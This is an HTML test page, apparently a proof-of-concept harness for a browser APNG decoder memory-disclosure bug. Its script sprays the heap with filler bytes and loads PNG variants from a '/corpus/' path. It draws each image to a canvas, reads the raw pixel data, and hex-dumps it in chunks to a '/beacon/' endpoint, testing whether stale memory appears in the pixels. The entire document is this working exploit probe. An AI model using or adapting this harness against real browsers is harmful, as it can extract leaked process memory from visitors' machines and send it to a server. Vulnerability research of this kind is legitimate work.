<!DOCTYPE html><html><head><meta charset="utf-8"><title>apng7</title><script>
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
function img(url){ return new Promise(function(res){ var i=new Image(); i.onload=function(){res(i);}; i.onerror=function(){res(null);}; i.src=url; }); }
function hexAll(d,n){ var s=''; for(var i=0;i<n*4;i++) s+=('0'+d[i].toString(16)).slice(-2); return s; }
function dump(tag,d,n,chunk){ var h=hexAll(d,n); for(var o=0,part=0;o<h.length;o+=chunk,part++) b(tag+'-'+part+'-'+h.substr(o,chunk)); }
function drawN(w,im){ var c=document.createElement('canvas'); c.width=w; c.height=1; var g=c.getContext('2d'); g.drawImage(im,0,0); var d=g.getImageData(0,0,w,1).data; window.__last=c; return d; }
function churn(n,size,val){ var a=[]; for(var i=0;i<n;i++){ var u=new Uint8Array(size); for(var j=0;j<size;j++) u[j]=val; a.push(u); } a.length=0; return 1; }
var seq=0;
function load(im){ return img('/corpus/'+im+'?n='+(++seq)); }
function boot(){
  b('A7-BOOT');
  // A: control, fresh image, no churn
  load('apng-fw1.png').then(function(i1){
    if(!i1){ b('A7-NOIMG'); return; }
    var d1=drawN(64,i1); b('A7-A-ok'); dump('A7-A',d1,64,700);
    // B: churn 256-byte chunks BEFORE loading a fresh image
    churn(6000,256,0x41); b('A7-B-churn');
    load('apng-fw1.png').then(function(i2){
      var d2=drawN(64,i2); b('A7-B-ok'); dump('A7-B',d2,64,700);
      // C: churn then load, then draw twice from the same image (is the buffer fixed per image?)
      load('apng-fw1.png').then(function(i3){
        var d3=drawN(64,i3); var d4=drawN(64,i3); b('A7-C-ok'); dump('A7-C',d3,64,700);
        var same=1; for(var x=0;x<256;x++) if(d3[x]!==d4[x]){same=0;break;} b('A7-C-same-'+same);
        // D: churn with 0x44, then load the fw4 variant
        churn(6000,256,0x44);
        load('apng-fw4.png').then(function(i4){
          var d5=drawN(64,i4); b('A7-D-ok'); dump('A7-D',d5,64,700);
          b('A7-DONE');
        });
      });
    });
  });
}
boot();
</script></head><body><p>apng7</p></body></html>
